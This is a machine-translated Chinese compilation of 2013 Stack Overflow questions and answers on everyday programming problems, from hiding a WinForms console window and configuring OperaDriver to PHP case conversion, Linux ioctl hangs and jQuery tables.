我正在使用 Windows 窗体并且我有一个主**窗体**，当我单击某个按钮时，他会打开一个**控制台窗口**，它会做一些工作，完成后我想关闭控制台而不关闭所有应用程序（主窗体）。我尝试使用`Environment.Exit(1)`或`Destroy()`属于`Destroy()`和`Create()`控制台窗口的功能关闭控制台。和都关闭控制台但也关闭表单`Environment.Exit(1)`。 `Destroy()`我想知道是否有办法只关闭控制台而不关闭整个应用程序

**编辑**

```
 private void btSync_Click(object sender, EventArgs e)
    {
        Create();
        ServerSync sycs=new ServerSync();
        Thread sync = new Thread(new ThreadStart(sycs.run));
        sync.Start();
    } 
```

`Create()`打开运行`Socket()`线程的控制台窗口。

**问题已解决** 当我启动线程时，我添加到代码 a 的末尾`ThreadName.Abort`并在线程外部检查是否`ThreadName.IsAlived==false`在 if i`Hide()`控制台内部，然后检查`Destroy()`它的工作原理！

`Hide()`来自***AppDeveloper***答案的方法。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:01:59.633

而不是使用`Environment.Exit()`隐藏`Console Window`

```
using System.Runtime.InteropServices;
[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

const int SW_HIDE = 0x0;
const int SW_SHOW = 0x5;

public static void HideConsoleWindow()
{
    var handle = GetConsoleWindow();
    ShowWindow(handle, SW_HIDE);

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T11:54:35.247

也许有一个 console.hide() 选项？可以试试看。

# c# - 给定实体更改选定的 DataGridView 行

> ID：15111344
> 
> 赞同：0
> 
> 时间：2013-02-27T11:48:10.050
> 
> 标签：c#, winforms, entity-framework, datagridview

我有一个 DataGridView，其 DataSource 设置为一个 BindingSource 控件，该控件绑定到一个 ObservableList 实体。

我将此网格用作只读网格，用于搜索目的。当一个项目被选中时，另一个 BindingSource 将更新为当前选定的项目。直到这里没有问题。

问题是在创建新项目时，我想在 DataGrid 中选择新项目，因为在保存用户之后应该能够编辑刚刚创建的记录的一些数据。

我怎样才能做到这一点？我只能提供实体本身或 ID，但我不知道该怎么做。我不太习惯使用 Windows 窗体，所以我确定我错过了一些微不足道的解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:50:19.010

您应该将`SelectedItem`网格的属性绑定到一个属性，您可以在其中设置您希望选择的实体。不确定，但您可能需要在网格上触发刷新，因为它可能不会自动刷新它的视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:53:32.083

好的，经过一些研究和检查“行”对象，我发现这个解决方案完全符合我的需求。

如果有人发现这种方法有任何缺陷，请告诉我。

保存新项目后，我会使用新的主键更新实体，然后调用以下函数：

```
private void SelectDataGridItem(Model.MyEntityType selectedItem)
{
    foreach (DataGridViewRow row in MyDataGrid.Rows)
    {
        var boundItem = (Model.MyEntityType) row.DataBoundItem;
        if (boundItem.Id == selectedItem.Id)
        {
            row.Selected = true;
            break;
        }
    }
} 
```

# javascript - 在 node.js 中与异步同步作斗争

> ID：15111346
> 
> 赞同：2
> 
> 时间：2013-02-27T11:48:26.577
> 
> 标签：javascript, node.js, asynchronous

所以我在 Node.js 中开始了一个小项目来了解它。它是 Arch linux 软件包系统的简单缓存代理，因为节点提供了大部分繁重的工作。

这有两个“主要”阶段，服务器设置和服务。然后服务有两个主要阶段，响应设置和响应。

“主要”设置包括检查一些文件，从文件中加载一些配置。从网址加载一些 json。然后使用此信息启动 http 服务器和代理实例。

*   设置记录器/选项 - 读取配置 - 读取镜像 - 读取 webmirror
*   开始服务

服务包括检查请求以查看文件是否存在，如果需要创建目录，然后提供响应。

*   检查请求 - 检查目录 - 检查文件
*   代理请求或服务文件

我一直将它们称为同步点，但搜索不会产生很多结果。在流程可以完成下一步之前必须完成一组异步任务的点。[Perl 的 AnyEvent 有条件变量](http://search.cpan.org/dist/AnyEvent/lib/AnyEvent.pm#CONDITION_VARIABLES)，我想这是我想要做的，没有阻塞。

首先，我发现我在“作弊”并使用提供的任何功能的同步版本，但不得不停止网络请求，所以我开始重组。大多数搜索立即导致使用异步或[步骤](https://encrypted.google.com/url?sa=t&rct=j&q=node%20steps&source=web&cd=1&cad=rja&ved=0CDMQFjAA&url=https://github.com/creationix/step&ei=ePAtUaGAGc2Thgfo6oEo&usg=AFQjCNFTmfgvelkRY8w0vV8g2tSh-KhsSw&sig2=HZqJsih1shIJZ12XM1UYxA&bvm=bv.42965579,d.ZG4)来控制流程。首先，我尝试了很多系列/并行设置，但是如果函数下面有任何异步调用会立即“完成”并且系列将完成，则会遇到问题。

经过多次哀号和咬牙切齿后，我最终得到了一个使用[async](https://github.com/caolan/async) .until 的“服务员”函数，该函数测试了在启动下一个函数之前完成的所有任务设置的某些程序状态。

```
// wait for "test" to be true, execute "run", 
// bail after "count" tries, waiting "sleep" ms between tries;
function waiter( test, run, count, sleep, message ) {
    var i=0;
    async.until( 
        function () {
            if ( i > count ) { return true; }
            logger.debug('waiting for',message, test() );
            return test();  
        },
        function (callback) {
            i++;
            setTimeout(callback, sleep );
        },
        function (err) {
            if ( i > count ) {
                logger.error('timeout for', message, count*sleep );
                return;
            }
            run()
        }
    );
} 
```

我觉得它相当大而且丑陋，需要一个模块来实现我认为是标准的东西，所以我想知道什么是更好的方法。我还在以非异步的方式思考吗？我忽略了 Node 中有什么简单的东西吗？有这样做的标准方法吗？

我想通过这种设置，如果程序变得复杂，将会有很多嵌套函数来描述程序的流程，而我正在努力寻找一种很好的方式来展示它。

任何提示将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:09:45.927

你不能真正让一切都同步。Nodejs 被设计为异步执行（这当然有时会折磨你）。但是有几种方法可以使其以同步方式工作（假设伪代码经过深思熟虑并且代码经过精心设计）：

*   使用回调
*   使用事件
*   使用承诺

回调和事件易于使用和理解。但是有了这些，有时代码会变得非常混乱且难以调试。

但是有了 Promise，你就可以避免这一切。您可以创建依赖链，称为“promises”（例如，仅在 Promise A 完成时执行 Promise B）。

早期版本的 node.js 实现了 Promise。他们承诺做一些工作，然后有单独的回调，将执行成功和失败以及处理超时。

但在后来的版本中，它被删除了。通过将它们从核心 node.js 中删除，它创造了构建具有不同承诺实现的模块的可能性，这些承诺可以位于核心之上。其中一些是[node-promise](https://github.com/kriszyp/node-promise)、[futures](https://github.com/coolaj86/futures)和[promises](http://howtonode.org/promises)。

有关更多信息，请参阅这些链接：

*   [框架](http://dailyjs.com/2011/06/02/framework-65/)
*   [承诺和未来](http://blogs.msdn.com/b/rbuckton/archive/2010/01/29/promises-and-futures-in-javascript.aspx)
*   [延迟承诺 - jQuery](http://api.jquery.com/deferred.promise/)

# sql-server - SQL 查询将 select-from-join 转换为 LinQ

> ID：15111347
> 
> 赞同：0
> 
> 时间：2013-02-27T11:48:27.217
> 
> 标签：sql-server, linq

我正在研究“NorthWind”数据库，我想将我的 SQL 代码转换为 LinQ。

这是我的代码：

```
select s.CompanyName,o.OrderID, o.Freight 
from Orders as o 
join Shippers as s on o.ShipVia = s.ShipperID 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:50:15.227

```
var query = from o in db.Orders
            join s in db.Shippers on o.ShipVia equals s.ShipperID
            select new {
               o.OrderID,
               o.Freight,
               s.CompanyName
            }; 
```

我建议您使用[LINQ Pad](http://www.linqpad.net/)来学习 LINQ 和测试您的查询。

# asp.net-mvc - MVC - 在视图中显示和隐藏许多控件的最佳方式

> ID：15111351
> 
> 赞同：0
> 
> 时间：2013-02-27T11:48:36.527
> 
> 标签：asp.net-mvc, controls

我有大约 20 个表单，每个表单都有 15-20 个文本框输入。

用户提交表单后，需要确认其所有值，这是通过将每个文本框替换为显示输入值的标签控件来完成的。

用户可以单击后退按钮来编辑数据，在这种情况下，文本框会重新出现，或者他们可以确认他们的数据提交。

在 MVC 中处理这个问题的最佳方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:11:15.923

我建议使用不同的视图来编辑和显示数据。如果您想省略或添加一些额外的字段，这可能很有用，从而使您的视图逻辑保持简单。您可以将表单数据存储在数据库中，并带有一些表示尚未确认的标志。确认后，您只需更改记录的标志。另一种选择是将表单数据存储在 tempData 或 Session 中，并在确认后保存。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T11:57:36.360

最快的方法可能是在页面上同时绑定到相同的模型属性，但将它们包装在一些简单的渲染逻辑中。剃刀中我头顶上的一个例子可能是这样的

```
@if (is in edit state){
<field markup>
@}
else{@
<label markup>
@} 
```

自从我在 MVC 应用程序上工作以来已经有一段时间了，但我想那时我就是这样做的。

# c# - OperaDriver 不工作

> ID：15111353
> 
> 赞同：1
> 
> 时间：2013-02-27T11:48:39.370
> 
> 标签：c#, opera, selenium-webdriver, selenium-grid

在 MSTest 类中使用 Selenium Grid2 和 RemoteWebDriver，我正在努力让 OperaDriver 正常工作。

我通过在 CMD 中运行以下命令来创建 Selenium hub 和 Opera 节点：

```
start java -jar selenium-server-standalone-2.30.0.jar -role hub
start java -jar selenium-server-standalone-2.30.0.jar -role node -port 7001 -browser "browserName=opera,version=11.62,maxInstances=5,platform=WINDOWS" -hub http://localhost:4444/grid/register 
```

这很好用，当我在浏览器中查看我的集线器时，我可以看到注册的节点。

但是每当我尝试`WebDriver`在我的 C# 测试类中创建一个新类时，我都会遇到异常：

```
DesiredCapabilities operaCapabilities = DesiredCapabilities.Opera();
operaCapabilities.SetCapability(CapabilityType.BrowserName, "opera");
operaCapabilities.SetCapability(CapabilityType.Platform, "WINDOWS");
operaCapabilities.SetCapability(CapabilityType.Version, "11.62");
operaCapabilities.SetCapability("opera.binary", "C:\\Program Files\\Opera\\opera.exe");
operaCapabilities.SetCapability("opera.port", 7001);
RemoteWebDriver operaDriver = new RemoteWebDriver(operaCapabilities); 
```

实际上我得到了两个不同的例外——第一次在 Selenium 中创建集线器和节点后，我得到了这个：

> 找不到支持捆绑启动器的平台，请手动设置
> 
> 构建信息：版本：'2.30.0'，修订：'dc1ef9c'，时间：'2013-02-19 00:15:27'
> 
> 系统信息：os.name：'Windows 8'，os.arch：'x86'，os.version：'6.2'，java.version：'1.7.0_15'
> 
> 驱动程序信息：driver.version：OperaDriver

之后每次我都会收到以下错误：

> 无法初始化类 com.opera.core.systems.runner.launcher.OperaLauncherRunner

我正在使用`Selenium-standalone-2.30.0`.

我使用的是 Opera 版本 12.14，但在看到[OperaDriver wiki 页面](https://code.google.com/p/selenium/wiki/OperaDriver)上的兼容版本列表后降级到 11.62，但错误仍然相同。

我尝试使用或不使用上述功能初始化 RemoteWebDriver，并且每次都得到相同的结果。

有谁知道这里的问题是什么以及如何让 RemoteWebDriver 以这种方式与 Opera 一起工作？

**编辑**：当我打开浏览器并查看时，可能是平台`Opera version 12.14`读取为`'WINDOWS 8'`，版本`11.62`读取为？正如我在节点和. 如果我尝试将 WINDOWS 8 指定为 RemoteWebDriver 的平台，则会在找不到匹配枚举的地方引发新异常：`"WIN32"``Opera``Help => About``WINDOWS``RemoteWebDriver`

> org.openqa.selenium.WebDriverException：java.lang.IllegalArgumentException：没有枚举常量 org.openqa.selenium.Platform.WINDOWS 8

**Edit2**：出于某种原因`CurrentPlatform`正在为我返回`Vista`，即使我正在跑步`Windows8`。

```
Platform platform = Platform.CurrentPlatform; 
```

而且我还注意到[`OperaDriver`源代码](https://github.com/operasoftware/operadriver/blob/master/src/com/opera/core/systems/runner/launcher/OperaLauncherRunner.java)检查大写的“VISTA”，而 C# 中的 Platform 读取为“Vista”。

这会导致问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-22T20:44:41.473

我也遇到了这个问题，感谢 eviltester 的提示，我能够通过使用以下命令行启动 selenium 服务器来解决这个问题：

```
java -Dos.name=windows -jar selenium-server-standalone-2.32.0.jar 
```

的使用`-Dos.name=windows`相当于`System.setProperty("os.name", "windows")`并且允许您的 C# selenium 代码在 Opera 浏览器上工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-17T14:22:07.110

我在 Java 中运行时看到了这一点。在调试模式下，OperaLauncherRunner.java launcherNameForOS 中的可能遗漏似乎不适合 Platform.getCurrent() 返回的 WIN8 枚举。

在 Java 中，我通过在创建新的 OperaDriver 之前将系统属性“os.name”设置为“windows”来伪造它。这迫使 Platform.getCurrent 返回 Opera 启动器满意的 XP。

所以在java中我只是使用了这个hack：

```
System.setProperty("os.name","windows");
driver = new OperaDriver(); 
```

# django - HTTP_USER_AGENT 脚本

> ID：15111360
> 
> 赞同：0
> 
> 时间：2013-02-27T11:48:49.563
> 
> 标签：django

有人可以解释这个脚本吗？

```
 device = {}

    ua = request.META.get('HTTP_USER_AGENT', '').lower()

    if ua.find("iphone") > 0:
        device['iphone'] = "iphone" + re.search("iphone os (\d)", ua).groups(0)[0] 
```

我知道它获取了用户代理，并且第一位搜索 iphone 的字符串。但

为什么 > 0？第二个喜欢做什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:59:59.230

我不是 python 人，但我几乎可以肯定`.find()`返回字符串“iphone”出现的位置。

因此，如果找到它，它将 >= 0。

# backbone.js - Backbone.LocalStorage 使用 Knockback 保存但不获取集合

> ID：15111361
> 
> 赞同：1
> 
> 时间：2013-02-27T11:48:49.570
> 
> 标签：backbone.js, coffeescript, local-storage, backbone.js-collections, knockback.js

`create`Backbone.LocalStorage 在调用集合时会在客户端存储玩家列表`players`，但稍后不会获取存储的模型，即使我可以在 localStorage 中检查它们。我可以调用`@collections.players.localStorage.findAll()`来检索所有存储的对象并手动将它们推送到我的集合中。

```
class App.Models.Player extends Backbone.Model
    defaults:
        name: 'Unnamed'
        team: 'Unassigned'

class App.Collections.Players extends Backbone.Collection
    localStorage: new Backbone.LocalStorage('players')
    model: App.Models.Player

class App.ViewModels.Game extends kb.ViewModel

    constructor: ->
        @collections =
            players: new App.Collections.Players()

        @collections.players.fetch(
            success: (collection) =>

                console.log(collection) # shows none
                console.log(@collections.players.localStorage.findAll())
                    # shows all the stored players
        )

        # @players below is rendered by a foreach in a knockout template
        @players = kb.collectionObservable @collections.players, { view_model: App.ViewModels.Player }

    addPlayer: -> # called when a button is pressed
        @collections.players.create(new App.Models.Player({ name: 'New Player' }))
        return 
```

为什么 Knockback 无法自动获取存储的实体？

以下调用手动检索所有对象：

```
_.each @collections.players.localStorage.findAll(), (elem) =>
    @collections.players.add(elem) 
```

# java - Visual VM 中的 RMI TCP Accept、Attach Listener 和 Signal Dispatcher 是什么？

> ID：15111365
> 
> 赞同：6
> 
> 时间：2013-02-27T11:49:03.910
> 
> 标签：java, visualvm

我正在使用 Visual VM 分析一个程序。[我的程序运行了一段时间，最后使用XChart](https://github.com/timmolter/XChart)弹出了一些显示结果的图。图表显示后，我注意到 Visual VM 中有一些活动线程“RMI TCP Accept”、“Attach Listener”和“Signal Dispatcher”。这些线程是什么？我假设它们仅与 Visual VM 相关。我对么？？

![来自 Visual VM 的屏幕截图](../Images/8b7f720810687ce7336905132e0f712d.png)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-13T16:14:42.977

这篇文章松散地回答了[https://stackoverflow.com/a/7698906/573057](https://stackoverflow.com/a/7698906/573057)

正如你所假设的；Attach、Signal 和 RMI TCP Accept 用于 jConsole、VisualVM 或类似工具的 JMX 监控。

其他用于垃圾收集（例如终结器、引用处理程序）。

# debugging - 在 IntelliJ 中调试 web 应用程序，由 maven 构建的 webapp，由 jetty 运行

> ID：15111366
> 
> 赞同：35
> 
> 时间：2013-02-27T11:49:07.310
> 
> 标签：debugging, web-applications, intellij-idea, jetty, maven-jetty-plugin

我正在使用 s/o 代码，它是一个由 maven 构建的 java webapp。webapp 由 maven 脚本运行，如下所示，该应用程序在 localhost:8080 上运行：

```
<build>
        <plugins>
            <plugin>
                <groupId>org.mortbay.jetty</groupId>
                <artifactId>jetty-maven-plugin</artifactId>
                <version>8.1.8.v20121106</version>
                <configuration>
                    <contextPath>/</contextPath>
                    <connectors>
                        <connector implementation="org.eclipse.jetty.server.nio.SelectChannelConnector">
                            <!--<port>8085</port>-->
                            <port>8080</port>
                            <maxIdleTime>60000</maxIdleTime>
                        </connector>
                    </connectors>
                    <stopKey>stop</stopKey>
                    <stopPort>8089</stopPort>
                </configuration>
            </plugin>            
        </plugins>
</build> 
```

我想附加 IntelliJ 的调试器，以便我可以单步执行代码。我尝试设置调试器配置，例如：Jetty Server，然后是“远程”，但它说未指定应用程序服务器。我还尝试了“本地”，它说“不包括主配置文件”。

那么我必须怎么做才能附加调试器呢？提前致谢。

* * *

## 回答 #1

> 赞同：81
> 
> 时间：2013-02-28T17:30:57.007

最简单的方法是：

1.  `Maven Projects`在选项卡中展开您的项目。
2.  展开`Plugins`>`jetty`项目。
3.  右键单击`jetty:run`。
4.  `Debug`从上下文菜单中选择。

[![的屏幕截图](../Images/d014780ed3d496a756057036dcb4506b.png)](https://i.stack.imgur.com/tunMq.jpg)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2016-07-20T21:43:02.813

我知道现在回答这个问题为时已晚，但值得分享有关此问题的最新更新作为现代解决方案：您也可以使用具有相同效果的“<code>mvnDebug jetty:run”运行码头。在终端中显示以下日志

```
Preparing to Execute Maven in Debug Mode
Listening for transport dt_socket at address: 8000
[INFO] Scanning for projects... 
```

只要记住选择正确的套接字地址（例如8000），然后：

1.  打开 Intellij
2.  运行 -> 编辑配置
3.  在运行/调试配置窗口中，您需要单击 (+) 按钮添加新配置
4.  选择远程
5.  保持默认配置不变，将监听端口改为对应的（8000）即可。

享受。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-24T22:52:39.903

当我得到“不包括主配置文件”时，这是因为在我的 OS X 升级期间删除了我的应用程序服务器配置（在运行/调试配置对话框上）中的 Jetty 路径（我把它放在 /usr/share/java ）。

我在 /usr/local 下重新安装了 jetty-hightide-8.1.5.v20120716，更新了配置，一切正常。

# php - 带有 javascript 问题的 100% 宽度标题？

> ID：15111370
> 
> 赞同：0
> 
> 时间：2013-02-27T11:49:12.953
> 
> 标签：php, javascript, fancybox

我一直在尝试放置一个完整的 100% 宽度标题，我在这里找到：[http ://codecanyon.net/item/full-width-slider-2/3430907](http://codecanyon.net/item/full-width-slider-2/3430907)

在我的网站上。但是因为我的网站上已经有模式弹出窗口，所以一旦我使用该标题，模式弹出窗口（我正在使用 Fancy Box）就会停止正常运行，它会打开一个新的页面窗口来显示其内容！这很奇怪，我不明白为什么这两个冲突。

任何人都可以指出我解决这个问题的正确方向吗？

谢谢

# php - php大写和小写没有内置函数

> ID：15111372
> 
> 赞同：-3
> 
> 时间：2013-02-27T11:49:15.110
> 
> 标签：php, uppercase, lowercase, built-in

嘿伙计们，我想将字符串从小写转换为大写，反之亦然，而不使用 php 中的任何内置函数 strtoupper 或 strtolower，谁能帮助我。

编辑：我可以使用其他一些函数来完成这项工作，例如 substr()、ord()、chr()、strlen()、str_replace。

这是我在这里的第一个问题，所以无法以最佳方式指定我需要什么。我的任务是在不使用数组的情况下完成这些提到的函数的工作。

...下次我会小心的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T12:07:24.510

c函数看起来像：

```
PHPAPI char *php_strtoupper(char *s, size_t len)
{
    unsigned char *c, *e;

    c = (unsigned char *)s;
    e = (unsigned char *)c+len;

    while (c < e) {
        *c = toupper(*c);
        c++;
    }
    return s;
}

PHPAPI char *php_strtolower(char *s, size_t len)
{
    unsigned char *c, *e;

    c = (unsigned char *)s;
    e = c+len;

    while (c < e) {
        *c = tolower(*c);
        c++;
    }
    return s;
} 
```

而且这些函数也使用`tolower`和`toupper`来自`ctype.h`C 库！看看[这里的来源](http://www.jbox.dk/sanos/source/include/ctype.h.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:55:18.700

```
function myStrToLower($string) {
    $from = range('A','Z');
    $to = range('a','z');
    return str_replace($from, $to, $string);
}

function myStrToUpper($string) {
    $from = range('a','z');
    $to = range('A','Z');
    return str_replace($from, $to, $string);
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T11:52:33.310

虽然我无法想象你为什么要这样做；您可以考虑制作一个将每个字母的小写字母与大写字母匹配的数组。然后对于字符串中的每个字符，在这个数组中找到它并返回值。（或者如果你要去另一个方向，那就是钥匙）。

虽然内置函数有开销，但我认为这种方法仍然会产生更多开销。

编辑：或者，您可以将每个字符转换为 ascii，然后检查范围以查看它是大写还是小写。然后加或减 32 (dec) 以更改为另一种情况。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T12:06:58.097

一种可能的实现（如果您允许 str_split）是：

```
function myToLowerCase( $str )
{
    static $charMap = array(
        'A' => 'a', 'B' => 'b', 'C' => 'c', 'D' => 'd', 'E' => 'e', 'F' => 'f',
        'G' => 'g', 'H' => 'h', 'I' => 'i', 'J' => 'j', 'K' => 'k', 'L' => 'l',
        'M' => 'm', 'N' => 'n', 'O' => 'o', 'P' => 'p', 'Q' => 'q', 'R' => 'r',
        'S' => 's', 'T' => 't', 'U' => 'u', 'V' => 'v', 'W' => 'w', 'X' => 'x',
        'Y' => 'y', 'Z' => 'z',
    );
    $chars = str_split( $str );
    $result = '';

    for ( $i = 0; $i < count( $chars ); $i++ )
    {
        if ( isset( $charMap[$chars[$i]] ) )
        {
            $result .= $charMap[$chars[$i]];
        }
        else
        {
            $result .= $chars[$i];
        }
    }

    return $result;
} 
```

通过查看示例，大写等效项应该是显而易见的。

# excel-2007 - SSAS多维数据集如何在excel（cubeset？MDX？其他？）

> ID：15111375
> 
> 赞同：0
> 
> 时间：2013-02-27T11:49:18.887
> 
> 标签：excel-2007, ssas

我有一个 SSAS 多维数据集，其日期维度连接到 Excel 工作表数据透视表。我想按日期范围过滤多维数据集数据 - 例如：从 2012 年 1 月 20 日到 2012 年 2 月 21 日。我一直在寻找解决方案，但还没有找到任何解决方案。我想也许通过使用简单的 MDX 代码（我还不知道 MDX）或像 CUBESET 这样的函数可能会有所帮助，但我不熟悉这些。任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:07:47.717

如果您想将多维数据集过滤为查询，您可以在 Excel 中通过删除日期维度作为过滤器并选择您感兴趣的日期或在 MDX 中执行此操作，例如 [DateDimension]。&[2012 年 1 月 21 日]：[日期维度].&[2012 年 2 月 21 日]

如果您要过滤多维数据集并仅向多维数据集使用者提供数据子集，则可以将 where 子句应用于数据源视图查询，然后重新处理多维数据集。然后，您的多维数据集将仅包含过滤后的集合。

# ruby-on-rails-3 - 未定义的方法'signed_in?' 使用“assert！controller.signed_in”时在黄瓜 BDD 中

> ID：15111376
> 
> 赞同：2
> 
> 时间：2013-02-27T11:49:22.880
> 
> 标签：ruby-on-rails-3, cucumber, bdd

我正在研究 rails-3 应用程序上的黄瓜 BDD。

当我使用**“断言！controller.signed_in？”** 在 step_definition 和当我运行“黄瓜”时，我得到了这个错误 **“未定义的方法'signed_in?' 对于 nil:NilClass (NoMethodError)"**

为什么它不进入控制器助手（签名_in？在会话助手中定义）？

当我尝试通过“ `assert ! SessionsController.signed_in?`”

```
Error : undefined method `signed_in?' for SessionsController:Class (NoMethodError) 
```

而当“ `assert ! SessionsHelpers.signed_in?`”错误：未定义的方法`signed_in？对于 SessionsHelper:Module (NoMethodError)

在我的 Sessions_helper 中：

```
def signed_in?
    !current_user.nil?
  end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T10:29:45.637

我也遇到了这个问题，并通过添加`World(SessionsHelper)`到 Cucumber 步骤文件的底部来解决它（可能有一个更好的放置位置）。

附带说明一下，您可能会遇到与 cookie 和会话相关的其他问题，因为 Cucumber 似乎不支持请求之间的这些问题。因此，例如，您将无法`signed_in?`在执行重定向/提交到登录表单后进行测试。

# java - java中的位操作，与c相比

> ID：15111377
> 
> 赞同：1
> 
> 时间：2013-02-27T11:49:23.157
> 
> 标签：java, c++, bitwise-operators

我正在尝试在 java 中转换 c++ 软件，但是位操作不会产生相同的结果。我在做什么的概述：有一个带有数据条目的 ascii 文件，2 个字节长，无符号（0-65535）。现在我想将两字节无符号整数转换为两个单字节无符号短整数。

C++ 代码：

```
signed char * pINT8;
signed char ACCBuf[3];
UInt16 tempBuf[128];

tempBuf[0] = Convert::ToUInt16(line);
pINT8 = (signed char *)&tempBuf[0];
ACCBuf[0] = *pINT8;
pINT8++;
ACCBuf[1] = *pINT8; 
```

Java代码：

```
int[] ACCBuf = new int[6];
int[] tempBuf = new int[128];
tempBuf[0] = Integer.parseInt(line);
ACCBuf[0] = tempBuf[0] >> 8;
ACCBuf[1] = 0x00FF & tempBuf[0]; 
```

这两个代码产生不同的结果。知道为什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:55:07.160

这可能取决于系统的字节序。`ACCBUF[0]`如果 C++ 代码是小端系统，则C++ 代码具有 in 中的低字节。`ACCBUF[0]`无论是什么硬件，Java 代码的高字节都在 中。

如果要在Java中得到相同的结果，必须交换高低字节

```
ACCBuf[0] = 0x00FF & tempBuf[0];
ACCBuf[1] = tempBuf[0] >> 8; 
```

现在您将在 Java 或 C++ 中拥有相同的位。

Another difference between the two code snippets are the types used. You have 32 bit ints in the Java code and 16 bit unsigned ints respectively 8 bit chars in C++. This isn't relevant here, but must be kept in mind, when comparing different code snippets.

# linux - 由于 IOCTL 调用，调试内核挂起

> ID：15111382
> 
> 赞同：2
> 
> 时间：2013-02-27T11:49:38.793
> 
> 标签：linux, module, linux-kernel, ioctl

我正在尝试制作一个在 2.6.32 内核上工作的内核模块以在 3.6 内核上工作。我们使用 IOCTL 调用来更新 Linux 内核模块中的结构。这些调用在 2.6.32 内核中运行良好。

当我在 3.6 内核中尝试相同的操作时，只要从用户空间应用程序进行 ioctl 调用，我就会面临内核挂起。它是基于套接字的接口而不是基于文件的接口，因此我们使用 struct proto_ops 下的 ioctl。

由于没有生成核心转储，我该如何调试这种情况。要从用户空间复制数据，我正在使用 copy_from_user 命令。

调试此方案的任何指针都会非常有帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-03-27T06:43:03.603

ioctl() 是内核的剩余部分之一，在大内核锁 (BKL) 下运行。过去，BKL 的使用使得长时间运行的 ioctl() 方法可以为不相关的进程创建较长的延迟。

以下是对将 unlocked_ioctl 和 compat_ioctl 引入 2.6.11 的补丁的解释。ioctl 字段的删除发生在很久以后，在 2.6.36 中。

解释：执行 ioctl 时，它占用了[Big Kernel Lock (BKL)](https://en.wikipedia.org/wiki/Giant_lock)，因此不能同时执行其他任何操作。这在多处理器机器上是非常糟糕的，因此需要付出很大的努力来摆脱 BKL。首先，引入了 unlocked_ioctl。它允许每个驱动程序编写者选择使用什么锁。这可能很困难，因此有一段时间旧驱动程序仍然可以工作（使用 ioctl），但新驱动程序可以使用改进的接口（unlocked_ioctl）。最终，所有驱动程序都被转换，并且可以删除 ioctl。

compat_ioctl 实际上是不相关的，即使它是同时添加的。其目的是允许 32 位用户态程序在 64 位内核上进行 ioctl 调用。ioctl 的最后一个参数的含义取决于驱动程序，因此无法进行与驱动程序无关的转换。

参考：[Jonathan Corbet](https://lwn.net/Kernel/LDD3/)的[ioctl() 新方法](https://lwn.net/Articles/119652/)

# javascript - 如何将列表中的选定数据添加到多个选择框中？

> ID：15111391
> 
> 赞同：1
> 
> 时间：2013-02-27T11:50:08.913
> 
> 标签：javascript, html

我想设计一个表单，我想从列表中选择多个数据，然后单击按钮我想将该数据添加到多个复选框。请任何人都可以提供我任何 java 脚本函数或其他东西提前谢谢。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-02-27T12:03:52.237

作为起点尝试使用 jQuery。

HTML：

```
<select type="multiple" id="mylist">
<option value="1" selected="selected">one</option>
<option value="2">two</option>
<option value="3" selected="selected">three</option>
<option value="4">four</option>
<option value="5" selected="selected">five</option>
<option value="6">six</option>
</select>

<div id="checkboxcontainer"></div>

<input type="button" id="clicker" value="clicker" /> 
```

JAVASCRIPT：

```
<script type="text/javascript">
$(function(){
    $("#clicker").click(function(){
        $("#checlboxcontainer").empty();
        $("#mylist option:selected").each(function(){
            $("#checlboxcontainer").append('<label><input type="checkbox" value="'+$(this).val()+'" /> '+ $(this).text() +' </label><br />');
        });
    });
});
</script> 
```

# jquery - 向现有表中添加一行

> ID：15111393
> 
> 赞同：0
> 
> 时间：2013-02-27T11:50:15.433
> 
> 标签：jquery, html-table

我已经[从 SO 阅读了这个问题，](https://stackoverflow.com/questions/1075415/jquery-add-html-table-column)但未能根据我的需要实现它。你可以帮帮我吗？

我有这个插件生成的 html：

```
<table cellspacing="0" class="grid" style="width: 30%">
<tr>
<th colspan="13" style="text-align: left; ">
<a rel="nofollow" href="http://...">Unique</a>&nbsp;(1&nbsp;issues) </th>
</tr>
<tr>
<th style="text-align: left; text-transform: capitalize;">Head1</th>
<th style="text-align: left; text-transform: capitalize;">Head2</th>
<th style="text-align: left; text-transform: capitalize;">Head3</th>
<th style="text-align: left; text-transform: capitalize;">Head4</th>
<th style="text-align: left; text-transform: capitalize;">Head5</th>
<th style="text-align: left; text-transform: capitalize;">Head6</th>
<th style="text-align: left; text-transform: capitalize;">Head7</th>
<th style="text-align: left; text-transform: capitalize;">Head8</th>
<th style="text-align: left; text-transform: capitalize;">Head9</th>
<th style="text-align: left; text-transform: capitalize;">Head10</th>
<th style="text-align: left; text-transform: capitalize;">Head11</th>
<th style="text-align: left; text-transform: capitalize;">Head12</th>
<th style="text-align: left; text-transform: capitalize;">Head13</th>
</tr>
<tr class="rowNormal">
<td nowrap="true">

<p><a href="http:...">Data1</a></p>
</td>
<td nowrap="true">

